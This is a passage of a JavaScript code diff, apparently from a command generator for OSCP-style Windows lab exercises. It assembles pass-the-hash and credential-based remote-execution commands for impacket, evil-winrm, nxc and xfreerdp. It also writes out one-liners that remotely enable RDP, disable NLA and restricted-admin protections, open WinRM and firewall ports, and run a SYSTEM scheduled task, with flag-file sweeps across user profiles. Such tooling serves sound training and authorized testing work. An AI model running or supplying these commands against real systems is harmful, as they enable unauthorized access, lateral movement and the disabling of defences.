+      : ("-u '" + activeUser + "' -p '" + (password || '{{password}}') + "'");
+    var impacketIdent = domPrefix + activeUser + (useHashAuth ? '' : (':' + (password || '{{password}}'))) + '@' + target;
+    var impacketAuthFlags = useHashAuth ? (' -hashes :' + activeHash) : '';
+    var evilWinrmAuth = useHashAuth
+      ? ("-i " + target + " -u '" + activeUser + "' -H '" + activeHash + "'")
+      : ("-i " + target + " -u '" + activeUser + "' -p '" + (password || '{{password}}') + "'");
+    var bloodyAuth = useHashAuth
+      ? ("--host " + target + " -d " + (domain || '{{domain}}') + " -u '" + activeUser + "' -p ':" + activeHash + "'")
+      : ("--host " + target + " -d " + (domain || '{{domain}}') + " -u '" + activeUser + "' -p '" + (password || '{{password}}') + "'");
+    var xfreerdpDomFlag = effAuthDomain ? (" /d:'" + effAuthDomain + "'") : '';
+    var xfreerdpAuth = useHashAuth
+      ? ("/v:" + target + xfreerdpDomFlag + " /u:'" + activeUser + "' /pth:" + activeHash)
+      : ("/v:" + target + xfreerdpDomFlag + " /u:'" + activeUser + "' /p:'" + (password || '{{password}}') + "'");
+    var rdpEnableWinCmd = '(reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f & reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389 & sc config TermService start= auto & net start TermService)';
+    var winrmEnableWinCmd = '(reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service" /v IPv4Filter /t REG_SZ /d "*" /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service" /v IPv6Filter /t REG_SZ /d "*" /f & reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & netsh advfirewall firewall add rule name=WinRM dir=in action=allow protocol=TCP localport=5985 & sc config WinRM start= auto & net stop WinRM & net start WinRM & schtasks /create /tn WinRMInit /tr "powershell.exe -NoProfile -Command Enable-PSRemoting -Force" /sc ONSTART /ru SYSTEM /f & schtasks /run /tn WinRMInit & ping -n 5 127.0.0.1 >nul & schtasks /delete /tn WinRMInit /f)';
+
+    var deckVariantSel = (eng.ui && eng.ui.deckVariantSel) || {};
+    var deckParams = (eng.ui && eng.ui.deckParams) || {};
+
+    function winProofVariants(paths, preferPs, isPathVerified) {
+      var list = Array.isArray(paths) ? paths : [paths];
+      var isSingleRoot = list.length === 1 && /proof\.txt|root\.txt/i.test(list[0]);
+      var singleNames = isSingleRoot ? 'proof.txt root.txt' : 'local.txt user.txt';
+      var singleRootFiles = isSingleRoot ? 'C:\\proof.txt C:\\root.txt' : 'C:\\local.txt C:\\user.txt';
+      var cmdTypeUnquoted = list.map(function (p) { return p.indexOf(' ') >= 0 ? ('type "' + p + '"') : ('type ' + p); }).join(' & ');
+      var psPaths = list.slice();
+      if (!isPathVerified && list.length === 1) {
+        var wildProfilePath = list[0].replace(/^([A-Za-z]:\\Users\\[^\\]+)\\/i, '$1.*\\');
+        if (wildProfilePath !== list[0]) psPaths.push(wildProfilePath);
+      }
+      var psGet = psPaths.map(function (p) { return '"' + p + '"'; }).join(', ');
+      var psSingleFilter = isSingleRoot ? '*root*.txt,*proof*.txt' : '*user*.txt,*local*.txt';
+      var uacCmdSuffix = ' & (net session >nul 2>&1 || (echo [!] UAC SPLIT-TOKEN: Non-elevated RDP cmd.exe cannot read C:\\Users\\Administrator! Opening elevated Admin cmd.exe - click Yes and run there: & powershell -NoP -c Start-Process cmd -Verb RunAs))';
+      var uacPsSuffix = '; if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Warning \'UAC SPLIT-TOKEN: Non-elevated RDP shell cannot read C:\\Users\\Administrator! Launching elevated Admin PowerShell...\'; Start-Process powershell -Verb RunAs }';
+      var guessNote = !isPathVerified
+        ? ('EDUCATED GUESS: Assumes ' + list.join(' + ') + ' before verifying the exact path - switch to the auto-find variant pill above to sweep all C:\\Users\\*\\Desktop profiles automatically, or locate the flag path first.')
+        : '';
+      var singleCmdHasSpace = list.length === 1 && list[0].indexOf(' ') >= 0;
+      var vCmdCommand = list.length === 1
+        ? (!singleCmdHasSpace
+            ? ('cmd /c "whoami & hostname & ipconfig & ' + cmdTypeUnquoted + '"')
+            : ('(whoami & hostname & ipconfig & type "' + list[0] + '")'))
+        : ('(whoami & hostname & ipconfig & type "' + list[0] + '" & echo. & whoami & hostname & ipconfig & type "' + list[1] + '"' + (!isPathVerified ? uacCmdSuffix : '') + ')');
+      var vPsCommand = list.length === 1
+        ? ('whoami; hostname; ipconfig; Get-Content ' + psGet + ' -Force -ErrorAction SilentlyContinue')
+        : ('whoami; hostname; ipconfig; Get-Content "' + list[0] + '" -Force -ErrorAction SilentlyContinue; ""; whoami; hostname; ipconfig; Get-Content "' + list[1] + '" -Force -ErrorAction SilentlyContinue' + (!isPathVerified ? uacPsSuffix : ''));
+      var vCmdFindCommand = list.length === 1
+        ? ('cmd /c "whoami & hostname & ipconfig & (for /f %d in (\'dir /b /ad C:\\Users 2^>nul\') do @for %n in (' + singleNames + ') do @if exist C:\\Users\\%d\\Desktop\\%n (echo --- C:\\Users\\%d\\Desktop\\%n --- & type C:\\Users\\%d\\Desktop\\%n 2>nul)) & for %f in (' + singleRootFiles + ') do @if exist %f (echo --- %f --- & type %f 2>nul)"')
+        : ('cmd /c "whoami & hostname & ipconfig & (for /f %d in (\'dir /b /ad C:\\Users 2^>nul\') do @for %n in (local.txt user.txt) do @if exist C:\\Users\\%d\\Desktop\\%n (echo --- C:\\Users\\%d\\Desktop\\%n --- & type C:\\Users\\%d\\Desktop\\%n 2>nul)) & for %f in (C:\\local.txt C:\\user.txt) do @if exist %f (echo --- %f --- & type %f 2>nul) & echo. & whoami & hostname & ipconfig & (for /f %d in (\'dir /b /ad C:\\Users 2^>nul\') do @for %n in (proof.txt root.txt) do @if exist C:\\Users\\%d\\Desktop\\%n (echo --- C:\\Users\\%d\\Desktop\\%n --- & type C:\\Users\\%d\\Desktop\\%n 2>nul)) & for %f in (C:\\proof.txt C:\\root.txt) do @if exist %f (echo --- %f --- & type %f 2>nul)"');
+      var vPsFindCommand = list.length === 1
+        ? ('whoami; hostname; ipconfig; Get-ChildItem -Path C:\\Users -Include ' + psSingleFilter + ' -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { "--- $($_.FullName) ---"; Get-Content $_.FullName -Force }')
+        : ('whoami; hostname; ipconfig; Get-ChildItem -Path C:\\Users -Include *user*.txt,*local*.txt -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { "--- $($_.FullName) ---"; Get-Content $_.FullName -Force }; ""; whoami; hostname; ipconfig; Get-ChildItem -Path C:\\Users -Include *root*.txt,*proof*.txt -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { "--- $($_.FullName) ---"; Get-Content $_.FullName -Force }' + uacPsSuffix);
+      var vCmd = { id: 'cmd', label: 'cmd.exe', tool: 'cmd', locus: 'onhost', isEducatedGuess: !isPathVerified, verifiedPath: !!isPathVerified, note: guessNote, command: vCmdCommand };
+      var vPs = { id: 'powershell', label: 'PowerShell', tool: 'powershell', locus: 'onhost', isEducatedGuess: !isPathVerified, verifiedPath: !!isPathVerified, note: guessNote, command: vPsCommand };
+      var vCmdFind = { id: 'cmd-search', label: 'cmd (auto-find)', tool: 'cmd', locus: 'onhost', isEducatedGuess: false, verifiedPath: true, note: 'Self-locating one-liner: sweeps all C:\\Users\\*\\Desktop profiles and prints ' + (list.length > 1 ? 'separate whoami + hostname + ipconfig blocks for local.txt and proof.txt.' : 'whoami, hostname, ipconfig, and the matching flag file.'), command: vCmdFindCommand };
+      var vPsFind = { id: 'ps-search', label: 'PS (auto-find)', tool: 'powershell', locus: 'onhost', isEducatedGuess: false, verifiedPath: true, note: 'Self-locating PowerShell one-liner: sweeps all C:\\Users profiles and prints ' + (list.length > 1 ? 'separate identity + IP blocks for local.txt and proof.txt.' : 'identity, IP, and the matching flag.'), command: vPsFindCommand };
+      return preferPs ? [vPs, vCmd, vPsFind, vCmdFind] : [vCmd, vPs, vCmdFind, vPsFind];
+    }
+
+    // Tab 1: Flags & Proof (On-Host Proof lanes ordered FIRST for OSCP/OffSec compliance)
+    var flagLanes = [];
+    if (!isLinuxOnly) {
+      flagLanes.push(pcMakeLane({
+        id: 'both-flags-onhost',
+        actionId: 'flag-hunt-root-windows',
+        title: 'Capture Root & User Flag Proofs On-Host',
+        sub: 'Admin Shell -> Individual proof.txt & local.txt Screenshots',
+        locked: !(isAdmin && (hasSmb || hasWinrm || hasRdp || hasWinShell)),
+        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 / 5985 Closed',
+        done: localFlagOnHost && rootFlagOnHost,
+        steps: [
+          {
+            id: 'open-admin-shell',
+            label: 'Open Interactive Admin Shell',
+            tool: hasWinrm ? 'evil-winrm' : (hasRdp ? 'xfreerdp' : 'impacket-psexec'),
+            locus: 'remote',
+            done: hasWinShell && isAdmin,
+            note: 'Spawns a full interactive SYSTEM / Administrator shell over SMB (psexec), WMI (wmiexec), WinRM (evil-winrm), or RDP (xfreerdp with local ./ share mounted at \\\\tsclient\\share). In RDP, open cmd.exe as Administrator so UAC does not block C:\\Users\\Administrator.',
+            selectedVariantId: hasWinrm ? 'evil-winrm' : (hasRdp ? 'xfreerdp' : 'psexec'),
+            variants: [
+              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags },
+              { id: 'evil-winrm', label: 'evil-winrm', tool: 'evil-winrm', locus: 'remote', command: "evil-winrm " + evilWinrmAuth },
+              { id: 'xfreerdp', label: 'xfreerdp', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." },
+              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '(whoami & hostname & ipconfig & (for /f %d in (\"dir /b /ad C:\\Users 2^>nul\") do @for %n in (local.txt user.txt) do @if exist C:\\Users\\%d\\Desktop\\%n (echo --- C:\\Users\\%d\\Desktop\\%n --- & type C:\\Users\\%d\\Desktop\\%n 2>nul)) & echo. & whoami & hostname & ipconfig & (for /f %d in (\"dir /b /ad C:\\Users 2^>nul\") do @for %n in (proof.txt root.txt) do @if exist C:\\Users\\%d\\Desktop\\%n (echo --- C:\\Users\\%d\\Desktop\\%n --- & type C:\\Users\\%d\\Desktop\\%n 2>nul)))'" }
+            ]
+          },
+          {
+            id: 'capture-root-proof',
+            label: 'Screenshot 1: Proof Flag On-Host',
+            tool: 'cmd',
+            locus: 'onhost',
+            done: rootFlagOnHost,
+            selectedVariantId: hasVerifiedRootPath ? 'cmd' : 'cmd-search',
+            isEducatedGuess: !hasVerifiedRootPath,
+            verifiedPath: !!hasVerifiedRootPath,
+            guessBadge: 'Educated Guess',
+            variantLabel: 'Shell:',
+            note: 'Run inside your Administrator shell to print whoami, hostname, ipconfig, and ONLY proof.txt in one clean frame for your Proof Flag screenshot.',
+            variants: winProofVariants([rootFlagWinPath], false, hasVerifiedRootPath)
+          },
+          {
+            id: 'capture-user-proof-admin',
+            label: 'Screenshot 2: User Flag On-Host',
+            tool: 'cmd',
+            locus: 'onhost',
+            done: localFlagOnHost,
+            selectedVariantId: hasVerifiedLocalPath ? 'cmd' : 'cmd-search',
+            isEducatedGuess: !hasVerifiedLocalPath,
+            verifiedPath: !!hasVerifiedLocalPath,
+            guessBadge: 'Educated Guess',
+            variantLabel: 'Shell:',
+            note: 'Run inside your Administrator shell to print its own whoami, hostname, ipconfig, and ONLY local.txt in a separate frame for your User Flag screenshot.',
+            variants: winProofVariants([userFlagWinPath], false, hasVerifiedLocalPath)
+          },
+          {
+            id: 'run-combined-proof',
+            label: 'Both Flags (2 ipconfig Blocks)',
+            tool: 'cmd',
+            locus: 'onhost',
+            done: localFlagOnHost && rootFlagOnHost,
+            selectedVariantId: (hasVerifiedLocalPath && hasVerifiedRootPath) ? 'cmd' : 'cmd-search',
+            isEducatedGuess: !(hasVerifiedLocalPath && hasVerifiedRootPath),
+            verifiedPath: !!(hasVerifiedLocalPath && hasVerifiedRootPath),
+            guessBadge: 'Educated Guess',
+            variantLabel: 'Shell:',
+            note: 'Prints two complete whoami + hostname + ipconfig blocks (Block 1 for local.txt, Block 2 for proof.txt) so each flag has its own ipconfig block.',
+            variants: winProofVariants([userFlagWinPath, rootFlagWinPath], false, hasVerifiedLocalPath && hasVerifiedRootPath)
+          }
+        ]
+      }, deckVariantSel));
+
+      flagLanes.push(pcMakeLane({
+        id: 'user-onhost-proof',
+        actionId: 'flag-hunt-windows',
+        title: 'Get On Host & Capture User Proof',
+        sub: 'Interactive Shell + On-Host Proof Frame',
+        locked: !(((hasWinrm || hasRdp) && hasCred) || (isAdmin && hasSmb) || hasWinShell),
+        lockReason: (hasWinrm || hasRdp) && !hasCred ? 'Requires Credential' : 'Ports 5985/3389 Closed (Needs Admin or Shell)',
+        done: localFlagOnHost,
+        steps: [
+          {
+            id: 'open-user-shell',
+            label: 'Open Interactive Host Session',
+            tool: hasWinrm ? 'evil-winrm' : (hasRdp ? 'xfreerdp' : 'impacket-psexec'),
+            locus: 'remote',
+            done: hasWinShell,
+            note: 'Connects to the target host so you can run the proof command inside an interactive shell (xfreerdp mounts your current directory as \\\\tsclient\\share).',
+            selectedVariantId: hasWinrm ? 'evil-winrm' : (hasRdp ? 'xfreerdp' : 'psexec'),
+            variants: [
+              { id: 'evil-winrm', label: 'evil-winrm', tool: 'evil-winrm', locus: 'remote', command: "evil-winrm " + evilWinrmAuth },
+              { id: 'xfreerdp', label: 'xfreerdp', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." },
+              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags }
+            ]
+          },
+          {
+            id: 'capture-user-proof',
+            label: 'Capture User Proof On-Host',
+            tool: (hasWinrm && !hasRdp) ? 'powershell' : 'cmd',
+            locus: 'onhost',
+            done: localFlagOnHost,
+            isEducatedGuess: !hasVerifiedLocalPath,
+            verifiedPath: hasVerifiedLocalPath,
+            guessBadge: 'Educated Guess',
+            variantLabel: 'Shell:',
+            note: 'Run inside your target shell (toggle cmd.exe or PowerShell) and paste the output back to record on-host proof.',
+            variants: winProofVariants([userFlagWinPath], !!(hasWinrm && !hasRdp), hasVerifiedLocalPath)
+          }
+        ]
+      }, deckVariantSel));
+
+      flagLanes.push(pcMakeLane({
+        id: 'user-smb-share',
+        actionId: 'flag-hunt-windows',
+        title: 'User Flag via SMB Share (From Kali)',
+        sub: 'Port 445 · No interactive shell required',
+        locked: !(hasCred && hasSmb),
+        lockReason: !hasSmb ? 'Port 445 Closed' : 'Requires Credential',
+        done: localFlagCaptured,
+        steps: [
+          {
+            id: 'locate-user-smb',
+            label: 'Locate user.txt on Users Share',
+            tool: 'nxc',
+            locus: 'remote',
+            done: hasVerifiedLocalPath || localFlagCaptured,
+            note: 'Spiders readable SMB shares from Kali to find the exact path to user.txt.',
+            variants: [
+              { id: 'nxc', label: 'nxc --spider', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --spider Users --regex \"(local|proof|user|root|flag)\\.txt$\"" },
+              { id: 'smbmap', label: 'smbmap -R', tool: 'smbmap', locus: 'remote', command: "smbmap -H " + target + " " + smbmapAuth + " -R Users --depth 5" },
+              { id: 'smbclient', label: 'smbclient recurse', tool: 'smbclient', locus: 'remote', command: "smbclient //" + target + "/Users " + smbClientAuth + " -c 'recurse; ls'" }
+            ]
+          },
+          {
+            id: 'read-user-smb',
+            label: 'Download & Print user.txt',
+            tool: 'smbclient',
+            locus: 'remote',
+            done: localFlagCaptured,
+            isEducatedGuess: !hasVerifiedLocalPath,
+            verifiedPath: hasVerifiedLocalPath,
+            guessBadge: 'Educated Guess',
+            note: hasVerifiedLocalPath
+              ? 'Downloads user.txt from the verified Users share path and prints it in your Kali terminal.'
+              : ('EDUCATED GUESS: Assumes ' + userFlagWinPath + ' before Step 1 is run - run Step 1 first to verify the exact path, or try this default path directly as a shortcut.'),
+            variants: [
+              { id: 'smbclient', label: 'smbclient get', tool: 'smbclient', locus: 'remote', command: "smbclient //" + target + "/Users " + smbClientAuth + " -c 'get \"" + userShareRelPath + "\" user.txt' && cat user.txt" },
+              { id: 'smbclient-stdout', label: 'smbclient stdout', tool: 'smbclient', locus: 'remote', command: "smbclient //" + target + "/Users " + smbClientAuth + " -c 'get \"" + userShareRelPath + "\" -'" },
+              { id: 'nxc', label: 'nxc --get-file', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --share Users --get-file '" + userShareRelPath + "' user.txt && cat user.txt" }
+            ]
+          }
+        ]
+      }, deckVariantSel));
+
+      flagLanes.push(pcMakeLane({
+        id: 'user-winrm-remote',
+        actionId: 'flag-hunt-windows',
+        title: 'User Flag via WinRM (From Kali)',
+        sub: 'Port 5985 · One-shot PowerShell',
+        locked: !(hasCred && hasWinrm),
+        lockReason: !hasWinrm ? 'Port 5985 Closed' : 'Requires Credential',
+        done: localFlagCaptured,
+        steps: [
+          {
+            id: 'locate-user-winrm',
+            label: 'Locate user.txt via WinRM',
+            tool: 'nxc',
+            locus: 'remote',
+            done: hasVerifiedLocalPath || localFlagCaptured,
+            variantLabel: 'Shell:',
+            note: 'Searches C:\\Users\\*\\Desktop for user.txt over WinRM without an interactive session.',
+            variants: [
+              { id: 'ps-winrm', label: 'PowerShell (-X)', tool: 'nxc', locus: 'remote', command: "nxc winrm " + target + " " + nxcAuth + " -X \"Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include *user*.txt,*local*.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName\"" },
+              { id: 'cmd-winrm', label: 'cmd.exe (-x)', tool: 'nxc', locus: 'remote', command: "nxc winrm " + target + " " + nxcAuth + " -x 'for /d %d in (C:\\Users\\*) do @dir /b /s /a-d \"%d\\Desktop\\*user*.txt\" \"%d\\Desktop\\*local*.txt\" 2>nul'" }
+            ]
+          },
+          {
+            id: 'read-user-winrm',
+            label: 'Read user.txt via WinRM',
+            tool: 'nxc',
+            locus: 'remote',
+            done: localFlagCaptured,
+            isEducatedGuess: !hasVerifiedLocalPath,
+            verifiedPath: hasVerifiedLocalPath,
+            guessBadge: 'Educated Guess',
+            variantLabel: 'Shell:',
+            note: hasVerifiedLocalPath
+              ? 'Prints whoami, hostname, ipconfig, and user.txt from the verified path remotely over WinRM.'
+              : ('EDUCATED GUESS: Assumes ' + userFlagWinPath + ' before Step 1 is run - run Step 1 first to verify the exact path, or switch to the auto-search variant.'),
+            variants: [
+              { id: 'ps-read-winrm', label: 'PowerShell (-X)', tool: 'nxc', locus: 'remote', isEducatedGuess: !hasVerifiedLocalPath, verifiedPath: hasVerifiedLocalPath, command: "nxc winrm " + target + " " + nxcAuth + " -X \"whoami; hostname; ipconfig; Get-Content '" + userFlagWinPath + "' -Force\"" },
+              { id: 'cmd-read-winrm', label: 'cmd.exe (-x)', tool: 'nxc', locus: 'remote', isEducatedGuess: !hasVerifiedLocalPath, verifiedPath: hasVerifiedLocalPath, command: "nxc winrm " + target + " " + nxcAuth + " -x 'whoami & hostname & ipconfig & type \"" + userFlagWinPath + "\"'" },
+              { id: 'ps-search-winrm', label: 'PS (auto-search)', tool: 'nxc', locus: 'remote', isEducatedGuess: false, verifiedPath: true, note: 'Self-locating WinRM one-liner: sweeps all C:\\Users\\*\\Desktop profiles and prints identity, IP, and user.txt.', command: "nxc winrm " + target + " " + nxcAuth + " -X \"whoami; hostname; ipconfig; Get-ChildItem -Path C:\\Users -Include *user*.txt,*local*.txt -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { '--- ' + $_.FullName + ' ---'; Get-Content $_.FullName -Force }\"" }
+            ]
+          }
+        ]
+      }, deckVariantSel));
+
+      flagLanes.push(pcMakeLane({
+        id: 'root-smb-exec',
+        actionId: 'flag-hunt-root-windows',
+        title: 'Root Flag via Admin Remote Exec (From Kali)',
+        sub: 'Port 445 / 135 · Instant One-Liner',
+        locked: !(isAdmin && hasSmb),
+        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
+        done: rootFlagCaptured,
+        steps: [
+          {
+            id: 'exec-root-remote',
+            label: 'Dump Root Flag',
+            tool: 'nxc',
+            locus: 'remote',
+            done: rootFlagCaptured,
+            isEducatedGuess: !hasVerifiedRootPath,
+            verifiedPath: hasVerifiedRootPath,
+            guessBadge: 'Educated Guess',
+            variantLabel: 'Tool:',
+            note: hasVerifiedRootPath
+              ? 'Dumps whoami, hostname, ipconfig, and root.txt from the verified path directly from Kali.'
+              : ('EDUCATED GUESS: Assumes ' + rootFlagWinPath + ' (standard Administrator Desktop) - or switch to nxc auto-search (-x) to sweep all user Desktops.'),
+            variants: [
+              { id: 'nxc', label: 'nxc -x', tool: 'nxc', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "nxc smb " + target + " " + nxcAuth + " -x '(whoami & hostname & ipconfig & type \"" + rootFlagWinPath + "\")'" },
+              { id: 'nxc-search', label: 'nxc auto-find', tool: 'nxc', locus: 'remote', isEducatedGuess: false, verifiedPath: true, note: 'Self-locating one-liner: sweeps all C:\\Users\\*\\Desktop profiles (including hidden files via /a-d and Administrator.<DC> folders) for root.txt/proof.txt and prints whoami, hostname, ipconfig, and the flag.', command: "nxc smb " + target + " " + nxcAuth + " -x '(whoami & hostname & ipconfig & for /f %d in (\"dir /b /ad C:\\Users 2^>nul\") do @for /f %f in (\"dir /b /s /a-d C:\\Users\\%d\\Desktop\\*root*.txt C:\\Users\\%d\\Desktop\\*proof*.txt 2^>nul\") do @(echo --- %f --- & type %f 2>nul))'" },
+              { id: 'nxc-ps', label: 'nxc -X', tool: 'nxc', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "nxc smb " + target + " " + nxcAuth + " -X \"whoami; hostname; ipconfig; Get-Content '" + rootFlagWinPath + "' -Force\"" },
+              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '(whoami & hostname & ipconfig & type \"" + rootFlagWinPath + "\")'" },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '(whoami & hostname & ipconfig & type \"" + rootFlagWinPath + "\")'" },
+              { id: 'wmiexec-ps', label: 'wmiexec -X', tool: 'impacket-wmiexec', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " 'powershell -NoP -c \"whoami; hostname; ipconfig; Get-Content \\\"" + rootFlagWinPath + "\\\" -Force\"'" },
+              { id: 'atexec', label: 'atexec', tool: 'impacket-atexec', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "impacket-atexec '" + impacketIdent + "'" + impacketAuthFlags + " '(whoami & hostname & ipconfig & type \"" + rootFlagWinPath + "\")'" }
+            ]
+          }
+        ]
+      }, deckVariantSel));
+
+      flagLanes.push(pcMakeLane({
+        id: 'root-enable-winrm',
+        actionId: 'flag-hunt-root-windows',
+        title: 'Enable WinRM Remotely -> Evil-WinRM Proof',
+        sub: '445 -> 5985 · Opens WinRM when closed',
+        locked: !(isAdmin && hasSmb),
+        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
+        done: rootFlagOnHost,
+        steps: [
+          {
+            id: 'enable-winrm-step',
+            label: 'Enable WinRM Listener & Firewall Port 5985',
+            tool: 'nxc',
+            locus: 'remote',
+            done: hasFact('host.winrm_enabled') || hasWinrm,
+            note: 'Configures WinRM AllowAutoConfig + IPv4Filter in Registry, sets LocalAccountTokenFilterPolicy=1, opens TCP 5985, restarts WinRM, and initializes PSRemoting as SYSTEM (avoids WMI Set-WSManQuickConfig Access Denied).',
+            variants: [
+              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '" + winrmEnableWinCmd + "'" },
+              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + winrmEnableWinCmd + "'" },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + winrmEnableWinCmd + "'" }
+            ]
+          },
+          {
+            id: 'connect-winrm-step',
+            label: 'Connect Interactive Evil-WinRM Session',
+            tool: 'evil-winrm',
+            locus: 'remote',
+            done: hasFact('winrm.authenticated') && hasWinShell,
+            note: 'Opens an interactive PowerShell session over port 5985.',
+            command: "evil-winrm " + evilWinrmAuth
+          },
+          {
+            id: 'proof-winrm-step',
+            label: 'Capture Proof Inside Evil-WinRM',
+            tool: 'powershell',
+            locus: 'onhost',
+            done: rootFlagOnHost,
+            isEducatedGuess: !(hasVerifiedLocalPath && hasVerifiedRootPath),
+            verifiedPath: !!(hasVerifiedLocalPath && hasVerifiedRootPath),
+            guessBadge: 'Educated Guess',
+            variantLabel: 'Shell:',
+            note: 'Run inside Evil-WinRM (PowerShell or cmd.exe) to print identity, IP, and both flags.',
+            variants: winProofVariants([userFlagWinPath, rootFlagWinPath], true, hasVerifiedLocalPath && hasVerifiedRootPath)
+          }
+        ]
+      }, deckVariantSel));
+
+      flagLanes.push(pcMakeLane({
+        id: 'root-enable-rdp',
+        actionId: 'flag-hunt-root-windows',
+        title: 'Enable RDP + Firewall Remotely -> xfreerdp Proof',
+        sub: '445 -> 3389 · Opens GUI Desktop',
+        locked: !(isAdmin && hasSmb),
+        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
+        done: rootFlagOnHost,
+        steps: [
+          {
+            id: 'enable-rdp-step',
+            label: 'Enable RDP, Disable NLA & Open Firewall Port 3389',
+            tool: 'nxc',
+            locus: 'remote',
+            done: hasFact('host.rdp_enabled') || hasRdp,
+            note: 'Enables Terminal Services, disables NLA, allows PtH/restricted admin, starts TermService, and opens port 3389.',
+            variants: [
+              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '" + rdpEnableWinCmd + "'" },
+              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + rdpEnableWinCmd + "'" },
+              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + rdpEnableWinCmd + "'" }
+            ]
+          },
+          {
+            id: 'connect-rdp-step',
+            label: 'Launch Interactive RDP Session (xfreerdp)',
+            tool: 'xfreerdp',
+            locus: 'remote',
+            done: hasFact('rdp.authenticated'),
+            note: 'Opens a graphical desktop session (/tls:seclevel:0 supports legacy Server 2008 R2 / 2012 TLS 1.0 as well as modern hosts; switch to /sec:rdp if TLS is disabled).',
+            variants: [
+              { id: 'xfreerdp-tls', label: 'xfreerdp', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." },
+              { id: 'xfreerdp-sec-rdp', label: 'xfreerdp /sec:rdp', tool: 'xfreerdp', locus: 'remote', note: 'Forces classic RDP encryption (no TLS handshake) once Step 1 has set UserAuthentication=0.', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /sec:rdp /tls:seclevel:0 +clipboard /dynamic-resolution /drive:share,." }
+            ]
+          },
+          {
+            id: 'proof-rdp-step',
+            label: 'Capture Proof in RDP Shell',
+            tool: 'cmd',
+            locus: 'onhost',
+            done: rootFlagOnHost,
+            isEducatedGuess: !(hasVerifiedLocalPath && hasVerifiedRootPath),
+            verifiedPath: !!(hasVerifiedLocalPath && hasVerifiedRootPath),
+            guessBadge: 'Educated Guess',
+            variantLabel: 'Shell:',
